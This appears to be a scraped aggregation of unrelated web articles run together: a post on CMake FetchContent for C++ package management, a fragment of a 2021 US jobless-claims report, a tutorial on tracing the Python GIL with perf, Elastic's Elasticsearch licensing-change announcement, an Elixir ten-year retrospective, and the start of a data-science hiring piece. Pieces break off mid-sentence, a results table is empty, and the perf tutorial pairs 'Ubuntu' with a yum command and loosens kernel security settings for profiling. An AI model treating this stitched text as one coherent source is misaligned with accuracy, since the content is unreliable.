<p>I get it. Conan, vcpkg and the many<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> others that exist are great, but they are external. Of course I’ve experimented with the popular C++ package managers, but I’ve been reluctant to actually start using one for my projects. They may have CMake integrations but they are not triggered by CMake. They try — and succeed — to be more than CMake. The thing is that, like it or not, CMake is, or at least getting really close to being, the de-facto standard build system for C++<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>. CMake is terrible in many ways, but it has proven to be the best we’ve have<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>.</p>

<p>So what do we get by bundling the package manager with the build system?</p>

<p><a href="https://en.wikipedia.org/wiki/Nix_package_manager">Nix</a> (which is awesome) or <a href="https://doc.rust-lang.org/cargo/guide/">Rust’s Cargo</a></p>

<h3 id="packages-from-source">Packages from source</h3>

<p>Oh, this package has <code>CMakeLists.txt</code>? You don’t need to download a binary when you can just fetch it and <code>add_subdirectory</code>… it<sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup>. It will inherit everything you need from your project.</p>

<h3 id="only-the-packages-we-need">Only the packages we need</h3>

<p>Sure, you can define different packages depending on platform, <a href="https://vcpkg.readthedocs.io/en/latest/users/triplets/">triplet</a>, and other configurations from other package managers, but you’re using their language. And then you have to either reimplement the same configuration analysis in you CMake files, or use some exports from those package managers, which is not always easy. If your package manager is within CMake, you already, inevitably, have all the tools to configure your build. The information for <a href="https://cmake.org/cmake/help/v3.3/variable/CMAKE_LANG_COMPILER.html">the compiler</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_CXX_STANDARD.html">standard</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_SYSTEM_NAME.html">target platform</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_SYSTEM_PROCESSOR.html">architecture</a>, the <a href="https://cmake.org/cmake/help/latest/variable/BUILD_SHARED_LIBS.html">linkage</a>, and <a href="https://cmake.org/cmake/help/latest/manual/cmake-toolchains.7.html">everything else</a> is already there.</p>

<h3 id="single-command-configuration">Single command configuration</h3>

<p><code>$ cmake .</code></p>

<p>…and everything works, everything is up to date, and everything is there. You are ready to build.</p>

<h2 id="can-i-use-fetchcontent-now">Can I use FetchContent now?</h2>

<p>Sort of.</p>

<p>Of course you can use the raw calls, even though they are not yet a package manager. <a href="https://github.com/adobe/lagrange/tree/72f9a5447b6803245d43a37a18b76e59c16fbda8/cmake/recipes/external">Adobe do exactly that</a>.</p>

<p>And, though the feature has been around for some time, I’m only aware of a single package manager which is built with it: <a href="https://github.com/TheLartians/CPM.cmake">CPM</a>.</p>

<p>Now, CPM is awesome and I’ve started using it in my personal projects. Everything new I make uses CPM and I’ve migrated some old stuff, too. However it’s not a mature and complete package manager. It can’t error on package version inconsistencies (though it can detect them) and it’s not built to handle binary packages. Source only. That, however, might be the thing you need. It is enough for most of my needs. I wholeheartedly recommend it for personal and/or small projects.</p>

<p>But!</p>

<p>There is a huge problem. Not with CPM, but with FetchContent itself. FetchContent can’t be <strong>the</strong> API package managers are built upon today.</p>

<p>This problem is performance. FetchContent is just too slow to be used for a serious load. It’s not an unfixable problem, but as far as I understand the issue, it will most likely have to be reimplemented. Here’s a table with me experimentig on different machines containing roughly<sup id="fnref:7" role="doc-noteref"><a href="#fn:7">7</a></sup> how much time it takes to run FetchContent per content item, or package. <a href="https://github.com/iboB/cmake-fetch-content-perf/blob/82ee13918550f18bbf22bd3bf38c721a7de9fb80/CMakeLists.txt">Here’s the CMakeLists.txt</a> I used. Note that these times are not from fetching the packages. They are from a “noop” run. One which identifies that everything is up to date, and does nothing.</p>

<table>
  <thead>
    <tr>
      <th>OS</th>
      <th>CMake Version</th>
      <th>Generator</th>
      <th>Machine</th>

</table>

<p>That’s at <em>configure time</em>, so every time the CMake scripts are touched, it will get executed. As you can see even the best time of roughly 200 ms per item is pretty bad, but the Windows times of over 1 second are abysmal. It’s simply prohibitive for a project with hundreds or even tens of dependencies to spend 1 second per dependency only to confirm that it’s up to date.</p>

<p>I opened <a href="https://gitlab.kitware.com/cmake/cmake/-/issues/21703">an issue on CMake’s tracker</a><sup id="fnref:8" role="doc-noteref"><a href="#fn:8">8</a></sup> about that, and hopefully it will get addressed in some way. I even have some ideas of how this can be addressed from the outside, just with CMake user code, but I hope it won’t come to this.</p>

<p>I truly believe that this is the future of C++ package management. If the preformance issue is fixed (or worked around), I think in several years C++ package management will be based on FetchContent. Whether CPM will become <em>the</em> new de-facto standard or some other not-yet-written software, I can’t tell, but this is it! I can feel it!</p>

Economists are hopeful the economy will turn around in late 2021.<!-- --> <!-- -->(Andrew West/The News-Press/USA Today Network/Reuters)</figcaption></figure></span></p>  <p>"While prospects for the economy later in 2021 are upbeat, the labour market recovery has taken a step backward," said Nancy Vanden Houten, an economist at Oxford Economics, "and we expect claims to remain elevated, with the risk that they rise from last week's levels."</p>  <p>Last week's applications for aid might have been elevated in part because state employment offices had been closed over the holidays, requiring some jobless people to wait until last week to apply.&nbsp;</p>  <h2>5.3 million Americans receiving jobless benefits</h2>  <p>In addition to last week's first-time applications for unemployment aid, the government said Thursday that 5.3 million Americans are continuing to receive state jobless benefits, up from 5.1 million in the previous week. It suggests that fewer people who are out of work are finding jobs.</p>  <p>About 11.6 million people received jobless aid from two federal programs in the week that ended Dec. 26, the latest period for which data is available. One of those programs provides extended benefits to people who have exhausted their state aid. The other supplies benefits to self-employed and contract workers.</p>  <p>Those two programs had expired near the end of December. They were belatedly renewed, through mid-March, in the $900-billion rescue aid package that Congress approved and President Donald Trump signed into law. That legislation also included $600 relief cheques&nbsp;for most adults and a supplemental unemployment benefit payment of $300 a week. Congressional Democrats favour boosting the cheques&nbsp;to $2,000 and extending federal aid beyond March, as does president-elect Joe Biden.</p>    <p>The U.S. job market's weakness was made painfully clear in the December employment report that the government issued last week. Employers shed jobs for the first time since April as the pandemic tightened its grip on consumers and businesses.</p>  <p>The figures also depicted a sharply uneven job market: The losses last month were concentrated among restaurants, bars, hotels and entertainment venues. Educational services, mostly colleges and universities, also cut workers in December. So did film and music studios.</p>  <p>Most other large industries, though, reported job gains. Many economists had expected last spring that job losses would spread to more industries. Though all sectors of the economy initially laid off workers, most of them have avoided deep job cuts. Manufacturing, construction, and professional services like engineering and architecture, for example, all added jobs in December.</p>  <p>At the same time, many companies seem reluctant to sharply ramp up hiring. A government report Tuesday showed that employers advertised fewer open jobs in November than in October. The decline, while small, was widespread across most industries.</p></span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>

<p>There are plenty of articles explaining why the Python GIL (The Global Interpreter Lock) exists<sup id="fnref-1"><a href="#fn-1">1</a></sup>, and why it is there. The TLDR version is: the GIL prevents multithreaded pure Python code from using multiple CPU cores.</p>
<p>However, in <a href="https://vaex.io/">Vaex</a> we execute most of the CPU intensive parts in C (C++) code, where we release the GIL. This is a common practice in high-performance Python libraries, where Python acts merely as a high-level glue.</p>
<p>However, the GIL needs to be released explicitly, and this is the responsibility of the programmer and might be forgotten, leading to suboptimal use of your machine.</p>
<p>I recently had this issue in <a href="https://github.com/vaexio/vaex/pull/1114">Vaex</a> where I simply forgot to release the GIL and found a similar issue in <a href="https://github.com/apache/arrow/pull/7756">Apache Arrow</a><sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Also, when running on 64 cores, I sometimes see a performance in Vaex that I am not happy with. It might be using 4000% CPU, instead of 6400% CPU, which is something I am not happy with. Instead of blindly pulling some levers to inspect the effect, I want to understand what is happening, and if the GIL is the problem, why, and where is it holding Vaex down.</p>


</div>

<p>I'm planning to write a series of articles explaining some tools and techniques available for profiling/tracing Python together with native extensions, and how these tools can be glued together, to analyze and visualize what Python is doing, and when the GIL it taken or dropped.</p>
<p>I hope this leads to improvement of tracing, profiling, and other performance tooling in the Python ecosystem, and the performance of the whole Python ecosystem.</p>

<h2 id="Linux">
Linux<a href="#Linux"> </a>
</h2>
<p>Get access to a Linux machine, and make sure you have root privileges (sudo is fine), or ask your sysadmin to execute some of these commands for you. For the rest of the document, we only run as user.</p>
<h2 id="Perf">
Perf<a href="#Perf"> </a>
</h2>
<p>Make sure you have perf installed, e.g. on Ubuntu:</p>

<pre><code>$ sudo yum install perf</code></pre>
<h2 id="Kernel-configuration">
Kernel configuration<a href="#Kernel-configuration"> </a>
</h2>
<p>To enable running it as a user:</p>

<pre><code># Enable users to run perf (use at own risk)
$ sudo sysctl kernel.perf_event_paranoid=-1

# Enable users to see schedule trace events:
$ sudo mount -o remount,mode=755 /sys/kernel/debug
$ sudo mount -o remount,mode=755 /sys/kernel/debug/tracing</code></pre>
<h2 id="Python-packages">
Python packages<a href="#Python-packages"> </a>
</h2>
<p>We will make use of <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> and <a href="https://github.com/maartenbreddels/per4m">per4m</a></p>

<pre><code>$ pip install "viztracer&gt;=0.11.2" "per4m&gt;=0.1,&lt;0.2"</code></pre>

</div>
</div>
</div><div>
<div>
<div>

<p>There is no way to get the GIL state in Python <sup id="fnref-3"><a href="#fn-3">1</a></sup> since there is no API for this. We can track it from the kernel, and the right tool for this under Linux is <strong>perf</strong>.</p>
<p>Using the linux perf tool (aka perf_events), we can listen to the state changes for processes/threads (we only care about sleeping and running), and log them. Although perf may look scary, it is a powerful tool. If you want to know a bit more about perf, I recommend reading <a href="https://jvns.ca/blog/2018/04/16/new-perf-zine/">Julia Evans' zine on perf</a> or <a href="http://www.brendangregg.com/perf.html">go through Brendan Gregg's website</a>.</p>
<p>To build our intuition, we will first run perf on a <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example0.py">very trivial program</a>:</p>


</div>
</div>
</div><div>
<div>
<div>
<p>We listen to just a few events to keep the noise down (note the use of wildcards):</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork \
        -e 'sched:sched_wak*' -- python -m per4m.example0
[ perf record: Woken up 2 times to write data ]
[ perf record: Captured and wrote 0,032 MB perf.data (33 samples) ]</code></pre>
<p>And use the <code>perf script</code> command to write human/parsable output.</p>

</div>
</div>
</div><div>
<div>
<div>
<p>Take a moment to digest the output. I can see a few things. Looking at the 4th column (time in seconds), we can see where the program slept (it skips 1 second). Here we see that we enter the sleeping state with a line like:</p>
<p><code>python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120</code></p>
<p>This means the kernel changed the state of the Python thread to <code>S</code> (=sleeping) state.</p>
<p>A full second later, we see it being woken up:</p>
<p><code>swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></p>
<p>Of course, you need to build some tooling around this, to really see what is happening. But one can imagine this output can be easily parsed and this is what <a href="https://github.com/maartenbreddels/per4m/">per4m</a> does. However, before we go there, I'd first like to visualize the flow of a slightly more advanced program using <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a>.</p>

</div>
</div>
</div><div>
<div>
<div>

<p><a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> is a Python tracer that can visualize what your program does in the browser. Let us run it on a slightly <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example1.py">more advanced example</a> to see what it looks like.</p>

</div>
</div>
</div><div>
<div>
<div>
<p>Running viztracer gives output like:</p>

<pre><code>$ viztracer -o example1.html --ignore_frozen -m per4m.example1
Loading finish                                        
Saving report to /home/maartenbreddels/github/maartenbreddels/per4m/example1.html ...
Dumping trace data to json, total entries: 94, estimated json file size: 11.0KiB
Generating HTML report
Report saved.</code></pre>
<p>And the HTML should render as:
<img src="https://www.maartenbreddels.com/images/copied_from_nb/per4m/example1.png" alt="image.png"></p>
<p>From this, it seems that <code>some_computation</code> seem to be executed in parallel (twice), while in fact, we know the GIL is preventing that. So what is really going on?</p>

</div>
</div>
</div><div>
<div>
<div>

<p>Let us run <code>perf</code> on this, similarly to what we did to example0.py. However, we add the argument <code>-k CLOCK_MONOTONIC</code> so that we use <a href="https://github.com/gaogaotiantian/viztracer/blob/3321ba4024afe5623f938a601d7f7db3b08f534d/src/viztracer/modules/snaptrace.c#L91">the same clock as VizTracer</a> and ask VizTracer to generate a JSON, instead of an HTML file:</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork -e 'sched:sched_wak*' \
   -k CLOCK_MONOTONIC  -- viztracer -o viztracer1.json --ignore_frozen -m per4m.example1</code></pre>
<p>Then …</p></div></div></div></div>

January 14, 2021 | https://www.elastic.co/blog/licensing-change | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/licensing-change">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><h2>Upcoming licensing changes to Elasticsearch and Kibana</h2><p>We are moving our Apache 2.0-licensed source code in Elasticsearch and Kibana to be dual licensed under Server Side Public License (SSPL) and the Elastic License, giving users the choice of which license to apply. This license change ensures our community and customers have free and open access to use, modify, redistribute, and collaborate on the code. It also protects our continued investment in developing products that we distribute for free and in the open by restricting cloud service providers from offering Elasticsearch and Kibana as a service without contributing back. This will apply to all maintained branches of these two products and will take place before our upcoming 7.11 release. Our releases will continue to be under the Elastic License as they have been for the last three years.
</p><p>This change in source code licensing has <b>no impact on the overwhelming majority of our user community</b> who use our default distribution for free. It also has <b>no impact on our cloud customers or self-managed software customers</b>.</p><p>In recent years, the market has evolved, and the community has come to appreciate that open source companies need to better protect their software to continue to innovate and make the investments required. As companies continue the shift to SaaS offerings, some cloud service providers have taken open source products and provided them as a service without investing back into the community. Moving to the dual license strategy with <a href="https://www.mongodb.com/licensing/server-side-public-license">SSPL</a> or the Elastic License is a natural next step for us after opening our commercial code and creating a free tier, all under the Elastic License, nearly 3 years ago. It is similar to those made by many other open source companies over these years, including <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">MongoDB</a>, which developed the SSPL. The SSPL allows free and unrestricted use, as well as modification, with the simple requirement that if you provide the product as a service, you must also publicly release any modifications as well as the source code of your management layers  under SSPL.
</p><h2>Our open origins</h2><p>My personal journey with open source goes a long way back. In 2005, I open sourced my first project, Compass, to provide a Java framework on top of Apache Lucene while I was building a recipe app for my wife. In the following five years, I invested many weekends and nights working on it, from writing code to helping users with bugs, features, and questions.
</p><p>I had no idea what I was signing up for, especially with a day job “on the side,” but I fell in love with the opportunity to make such a positive impact — trying to build a great product, but more importantly, a great community around it, through the power of open source.
</p><p>In 2009, I decided to do it again, and started to write a brand new project called Elasticsearch. I spent many nights and weekends building it, and in 2010 open sourced it. I even quit my job and decided to dedicate my full attention to it. To be there for the users, through writing code, and engaging on GitHub, mailing lists, and IRC.
</p><p>And when we founded Elastic as a company in 2012, we brought the same spirit to our company. We invested heavily in our free and open products, and supported the rapid growth of our community of users. We expanded from just Elasticsearch to Kibana, Logstash, Beats, and now a complete set of solutions built into the Elastic Stack: Elastic Enterprise Search, Observability, and Security.
</p><p>We have matured the products, fostered vibrant communities around them, and focused on providing the greatest amount of value to our users. Today, we have hundreds of engineers who wake up every day and work to make our products even better. And we have hundreds of thousands of community members who engage with us and contribute to our shared success.
</p><p>I am proud of the company we built, and humbled by the level of trust that we have earned with our user base. This starts by being open and transparent, and continues with being true to our community and user base in our choices.
</p><h2>Free and open FTW</h2><p>Back in 2018, we <a href="https://www.elastic.co/blog/doubling-down-on-open">opened the code of our free and paid proprietary features</a> under the Elastic License, a source-available license, and we changed our default distribution to include all of our features, with all free features enabled by default.
</p><p>We did this for a few reasons. It allowed us to engage with our paying customers in the same way we engage with our community: in the open. It also allowed us to build free features that empower our users without providing those capabilities to companies that take our products and provide them as a service, like Amazon Elasticsearch Service, and profit from our open source software without contributing back.
</p><p>This approach was well received — today, over 90% of new downloads choose this distribution — and has allowed us to make so much of our work available for free while also building a successful company.
</p><p>The list of improvements under this new free and open, yet proprietary, license, is overwhelming. I am humbled by the amazing progress our team and community has made across all our products, so much so that I would love to share some of them:
</p><p>We've dramatically improved the speed, scalability, and reliability of Elasticsearch, with a new distributed consensus algorithm and significantly reduced memory usage, in addition to new data storage and compression approaches that have reduced the typical index size by nearly 40% while improving indexing and query throughput. We added new field types for geospatial analysis, and more efficient ways to store and search logs and perform fast, case-insensitive search on security data. In Kibana, we cut load time by 80% and eliminated whole-page refreshes thanks to a multiyear replatforming project, while at the same time introducing an intuitive drag-and-drop data visualization experience with Kibana Lens, key capabilities like dashboard drill-downs, and so much more.
</p><p>Over the last three years, we also built first-class experiences around our most common use cases. In the security area, we created a free and open SIEM right inside Kibana, with a powerful detection engine that supports simple rules as well as complex correlations via a new query language called EQL in Elasticsearch. We include hundreds of detection rules, which we develop publicly, in collaboration with our community. And we joined forces with Endgame, a leading endpoint security company, and have released powerful malware protection for free as part of the Elastic Agent, our unified, centrally managed observability and security agent for servers and endpoints, with more to come.
</p><p>In observability, the story is similar. We've built an entire observability suite right inside Kibana — from a live-tail logging UI to an intuitive infrastructure-level view of the key metrics and alerts across your hosts, pods, and containers. And we now have a fully featured APM product with open source data collectors and agents, supporting OpenTelemetry, real user monitoring (RUM), synthetic monitoring, and the recent addition of user experience monitoring.
</p><p>With Elastic Enterprise Search, we introduced App Search, a layer on top of Elasticsearch that simplifies building rich applications and provides powerful management interfaces for relevance tuning, as well as analytics on how it's being used. We also provide a free Workplace Search product that makes it easy to integrate and search the content sources that you use to run your life or company, like Google Workplace, Microsoft 365, Atlassian Jira and Confluence, and Salesforce.
</p><p>It is simply amazing that we've been able to build all of these capabilities and provide them for free to our community. It has been humbling to see the level of engagement and adoption around our products and how these new features have helped so many people and businesses succeed. And this was possible because the overwhelming majority of our community chose our default distribution under the Elastic License, where all these features are free and open.
</p><h2>Why change?</h2><p>As previously mentioned, over the last three years, the market has evolved and the community has come to appreciate that open source companies need to better protect their software in order to maintain a high level of investment and innovation. With the shift to SaaS as a delivery model, some cloud service providers have taken advantage of open source products by providing them as a service, without contributing back. This diverts funds that would have been reinvested into the product and hurts users and the community.
</p><p>Similar to our open source peers, we have lived this experience firsthand, from our trademarks being misused to outright attempts to splinter our community with “open” repackaging of our OSS products or even taking “inspiration” from our proprietary code. While each open source company has taken a slightly different approach to address this issue, they have generally modified their open source license in order to protect their investment in free software, while trying to preserve the principles of openness, transparency, and collaboration. Similarly, we are taking the natural next step of making a targeted change to how we license our source code. This change won't affect the vast majority of our users, but it will restrict cloud service providers from offering our software as a service.
</p><p>We expect that a few of our competitors will attempt to spread all kinds of FUD around this change. Let me be clear to any naysayers. We believe deeply in the principles of free and open products, and of transparency with the community. Our track record speaks to this commitment, and we will continue to build upon it.
</p><h2>The change</h2><p>Starting with the upcoming Elastic 7.11 release, we will be moving the Apache 2.0-licensed code of Elasticsearch and Kibana to be dual licensed under SSPL and the Elastic License, giving users the choice of which license to apply. SSPL is a source-available license created by MongoDB to embody the principles …</p></div></div></div></div></div>

This past weekend, on January 9th, we celebrated 10 years since <a href="https://github.com/elixir-lang/elixir/commit/337c3f2d569a42ebd5fcab6fef18c5e012f9be5b">the first commit to the Elixir repository</a>. While I personally don’t consider <a href="https://elixir-lang.org/">Elixir</a> to be 10 years old yet - the language that became what Elixir is today <a href="https://github.com/elixir-lang/elixir/commit/6052352b6281752b905b30eb5b08fac0f51f68cd">surfaced only 14 months later</a> - a decade is a mark to celebrate!</p>
<p>
The goal of this post is to focus on the current state of some projects in the ecosystem and then briefly highlight a few of the exciting efforts coming over the next months.</p>
<h2>
Recap: The language goals</h2>
<p>
When I started working on Elixir, I personally had the ambition of using it for building scalable and robust web applications. However, I didn’t want Elixir to be tied to the web. My goal was to design an <em>extensible</em> language with a diverse ecosystem. Elixir aims to be a general purpose language and allows developers to extend it to new domains.</p>
<p>
Given Elixir is built on top of Erlang and Erlang is used for networking and distributed systems, Elixir would naturally be a good fit in those domains too, as long as I didn’t screw things up. The Erlang VM is essential to everything we do in Elixir, which is why <em>compatibility</em> has become a language goal too.</p>
<p>
I also wanted the language to be <em>productive</em>, especially by focusing on the tooling. Learning a functional programming language is a new endeavor for most developers. Consequently their first experiences getting started with the language, setting up a new project, searching for documentation, and debugging should go as smoothly as possible.</p>
<p>
Extensibility, compatibility, and productivity are the goals we built the language upon.</p>
<h2>
Recap: Elixir in production</h2>
<p>
Last year we started <a href="https://elixir-lang.org/cases.html">a series of articles on companies using Elixir in production on the official website</a>. As of today, we have 7 production cases listed with more coming this year! Overall it is very exciting to see many different companies using a variety of business models and industries running Elixir in production.</p>
<p>
Companies like <a href="https://www.brex.com/">Brex</a> (<a href="https://elixir-lang.org/blog/2020/06/23/growing-with-elixir-at-brex/">case</a>), <a href="https://discord.com/">Discord</a> (<a href="https://elixir-lang.org/blog/2020/10/08/real-time-communication-at-scale-with-elixir-at-discord/">case</a>), <a href="https://getdivvy.com/">Divvy</a>, <a href="https://www.podium.com/">Podium</a>, and <a href="https://salesloft.com/">SalesLoft</a> have reached <a href="https://en.wikipedia.org/wiki/Unicorn_(finance)">“unicorn status”</a> and rely heavily on Elixir. Startups like <a href="https://www.joinblvd.com/">Boulevard</a> (<a href="https://soundcloud.com/elixirtalk/episode-166-feat-sean-stavropoulos">podcast</a>), <a href="https://community.com/">Community</a>, <a href="https://duffel.com/">Duffel</a> (<a href="https://elixir-lang.org/blog/2020/12/10/integrating-travel-with-elixir-at-duffel/">case</a>), <a href="https://www.ockam.io/">Ockam</a>, <a href="https://www.mux.com/">Mux</a>, <a href="https://ramp.com/">Ramp</a>, <a href="https://remote.com/">Remote</a>, and <a href="https://www.v7labs.com/">V7</a> (<a href="https://elixir-lang.org/blog/2021/01/13/orchestrating-computer-vision-with-elixir/">case</a>) also use Elixir and have received funding in the last year or two. Elixir is also used within known brands and enterprises such as <a href="https://bleacherreport.com/">Bleacher Report</a>, <a href="https://www.change.org/">Change.org</a> (<a href="https://elixir-lang.org/blog/2020/10/27/delivering-social-change-with-elixir-at-change.org/">case</a>), <a href="https://heroku.com/">Heroku</a> (<a href="https://elixir-lang.org/blog/2020/09/24/paas-with-elixir-at-Heroku/">case</a>), <a href="https://www.pagerduty.com/">PagerDuty</a>, <a href="https://www.pepsico.com/">PepsiCo</a>, and <a href="https://www.therealreal.com/">TheRealReal</a>.</p>
<p>
There is also a special category of startups that run Elixir alonside an open source model, such as <a href="https://plausible.io/">Plausible Analytics</a>, <a href="https://app.supabase.io/">Supabase</a>, <a href="https://logflare.app/">Logflare</a> (<a href="https://runninginproduction.com/podcast/11-logflare-is-a-log-management-and-event-analytics-platform">podcast</a>), and <a href="https://hex.pm/">Hex.pm</a> (<a href="https://runninginproduction.com/podcast/19-hexpm-is-elixirs-official-package-manager">podcast</a>) itself. Still on the open source front, you will find projects like <a href="https://pleroma.social/">Pleroma</a> and <a href="https://changelog.com/">Changelog</a>. There also many small scale and hobby projects that use Elixir for a productive and joyful development experience.</p>
<h2>
Recap: Diverse ecosystem</h2>
<p>
Today, Elixir has a diverse ecosystem that works on a wide range of domains and industries. Let’s take a look at some examples.</p>
<h3>
Web</h3>
<p>
Most developers are familiar with using Elixir for web development thanks to <a href="https://phoenixframework.org/">the Phoenix web framework</a>. Phoenix gained traction in the ecosystem because it was the first to fully leverage the language and the platform for building real-time applications besides the usual MVC (Model-View-Controller) offering.</p>
<p>
It all started with Phoenix Channels, as a bi-directional communication between clients and servers, and Phoenix PubSub, which uses Erlang’s distributed compatibilities to broadcast messages across nodes. As far as I know, Phoenix was the first major web framework to provide a multi-node web real-time solution completely out-of-the-box. Regardless if you are using one node or ten nodes, everything just works, with minimal configuration and dependencies.</p>
<p>
Phoenix has matured a lot since its first stable release. Phoenix v1.2 included <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Phoenix Presence</a>, that allows developers to track which users, IoT devices, etc are connected to your cluster right now. No databases or external dependencies required! This is one of the problems that look deceptively simple at first, but once you outline all scalability, performance, and fault-tolerance requirements, it <a href="https://elixir-lang.org/blog/2020/11/17/real-time-collaboration-with-elixir-at-slab/">becomes quite complex</a>. Luckily, Phoenix is running on a platform that excels at these problems, and I am not aware of any other framework that provides such a lean and elegant solution as part of its default stack.</p>
<p>
Most recently, <a href="https://github.com/phoenixframework/phoenix_live_view">Phoenix LiveView</a> was released and brought new ways to build rich, real-time user experiences with server-rendered HTML, inspiring developers to attempt similar solutions for other languages and frameworks. You can read the <a href="https://dockyard.com/blog/2018/12/12/phoenix-liveview-interactive-real-time-apps-no-need-to-write-javascript">original announcement</a> or <a href="https://www.phoenixframework.org/blog/build-a-real-time-twitter-clone-in-15-minutes-with-live-view-and-phoenix-1-5">learn how to build a real-time Twitter clone in 15 minutes</a>. As part of the <em>Live</em> family, we have also announced <a href="https://twitter.com/josevalim/status/1250846714665357315">Phoenix LiveDashboard</a>, making monitoring and instrumentation a first-class citizen for Phoenix applications.</p>
<h3>
Embedded and IoT</h3>
<p>
While I always expected Elixir to shine for building web applications, I was taken by surprise when I heard about the <a href="https://www.nerves-project.org/">Nerves platform</a> for creating high-end embedded applications. However, once I learned their premise, it all made sense: writing embedded systems <em>is</em> complicated. Reasoning about failures is hard. So what if we could leverage the decades of lessons learnt by Erlang/OTP to design embedded applications? What if a fault on the Wi-Fi driver could be fixed by having a supervisor simply restart it? After all, the first major use of Erlang/OTP was in an embedded system, the Ericsson AXD301 ATM switch.</p>
<p>
Nerves brings the Elixir ecosystem and the battle-tested Erlang VM to edge computing, providing a rich developer experience using proven technology. Nerves started as a one step process for turning an Elixir project into a complete software image for common hardware devices. Today, Nerves is being used in production in industrial automation, machine learning, consumer electronics and more, with <a href="https://farm.bot/">Farmbot</a> (<a href="https://elixir-lang.org/blog/2020/08/20/embedded-elixir-at-farmbot/">case</a>) and <a href="https://www.rosepoint.com/">Rose Point Navigation</a> being two of the most notable examples.</p>
<p>
The Nerves team also created <a href="https://www.nerves-hub.org/">NervesHub</a>, a fully open-source device management system. Combining all these technologies makes Elixir a comprehensive language for building end-to-end IoT platforms.</p>
<h3>
Data ingestion and pipelines</h3>
<p>
Shortly after Elixir v1.0 was released, the Elixir Core Team and I started looking into abstractions for tackling data ingestions and data pipelines in Elixir. We ran through a couple designs until we eventually <a href="https://elixir-lang.org/blog/2016/07/14/announcing-genstage/">landed on GenStage</a>: a behaviour for exchanging data with back-pressure between Elixir processes and external systems. For an introduction, make sure to check out <a href="https://youtu.be/srtMWzyqdp8?t=242">my keynote introducing both GenStage and Flow</a>.</p>
<p>
Today, almost 5 years later, GenStage has been used by many industries and has become one of the factors driving Elixir adoption. For example, you can read how both <a href="https://elixir-lang.org/blog/2020/10/08/real-time-communication-at-scale-with-elixir-at-discord/">Discord</a> and <a href="https://elixir-lang.org/blog/2020/10/27/delivering-social-change-with-elixir-at-change.org/">Change.org</a> have built systems on Elixir and GenStage that handle spikes and run at massive scale.</p>
<p>
However, GenStage was just the beginning. In 2019, <a href="https://www.youtube.com/watch?v=ZOExnT1PYjs">we announced Broadway</a>, which is a higher-level abstraction on top of GenStage that makes building data ingestion pipelines a breeze. We originally released with Amazon SQS support. Nowadays, RabbitMQ, Google Cloud PubSub, Apache Kafka, and other sources (known as producers in Broadway terms) are also available.</p>
<h3>
Audio/Video streaming</h3>
<p>
Since the Erlang VM was designed for scalable network processing, one can expect to also be an excellent platform for audio and video streaming. However, if you also wanted to process and transform those streams on the fly, the situation becomes much more complicated as you likely have to integrate with native code.</p>
<p>
Luckily, the tables have turned when Erlang/OTP 20 was released a couple years ago with the so-called Dirty NIFs. The Erlang VM always had the ability to invoke native code, but this native code could not run for long, as to not interfere with the preemptive features of the Erlang runtime. Dirty NIFs allow developers to tag native code either as IO or CPU bound, which runs on specific threads. Between ports (I/O based), NIFs, Dirty NIFs, and remote nodes, developers now have many options to interface with native code with different performance and reliability guarantees. That’s exactly the foundation the <a href="http://www.membraneframework.org/">Membrane Framework</a> builds on top of.</p>
<p>
Membrane was extracted from RadioKit, a startup aiming at disrupting the radio broadcasting industry. Originally it focused on processing and mixing audio. Later, <a href="https://www.swmansion.com/">Software Mansion</a> acquired the framework and provided stable funding and a solid team to help it grow into a full-scale framework. Currently, it allows developers to process, transmit, broadcast, and transform audio and videos streams on the fly. Whether you are building a Twitch clone, a VOD application or a video conferencing system, Membrane provides a growing set of high-level abstractions and pre-made modules so you don’t have to dive into idiosyncrasies of particular codecs, protocols, and formats. </p>
<h2>
Looking ahead: what is coming in 2021</h2>
<p>
The year of 2021 looks very exciting for the Erlang Ecosystem and the Elixir community. In this section, we are going to mention some of the things we expect to see in 2021.</p>
<h3>
Erlang/OTP 24 with JIT</h3>
<p>
In September 2020, <a href="https://github.com/erlang/otp/pull/2745">Lukas Larsson and the Erlang/OTP team</a> announced a JIT compiler for the Erlang VM called BeamAsm. How faster the JIT will be in practice depends on your application but the results posted in the announcement are promising. To quote Lukas:</p>
<blockquote>
  <p>
If we run the JSON benchmarks found in the <a href="https://github.com/devinus/poison/tree/master/bench">Poison</a> or <a href="https://github.com/michalmuskala/jason/tree/master/bench">Jason</a>, BeamAsm achieves anything from 30% to 130% increase (average at about 70%) in the number of iterations per second for all Erlang/Elixir implementations. For some benchmarks, BeamAsm is even faster than the pure C implementation <a href="https://github.com/davisp/jiffy">jiffy</a>.  </p>
</blockquote>
<blockquote>
  <p>
More complex applications tend to see a more moderate performance increase, for instance, RabbitMQ is able to handle 30% to 50% more messages per second depending on the scenario.  </p>

<p>Data. It’s everywhere and we’re <a href="https://techjury.net/blog/how-much-data-is-created-every-day/#gref">only getting more of it</a>. For the last 5-10 years, <em>data science</em> has attracted newcomers near and far trying to get a taste of that forbidden fruit. </p>
<p>But what does the state of <em>data science</em> hiring look like today?</p>
<p>Here’s the gist of the article in two-sentences for the busy reader.</p>
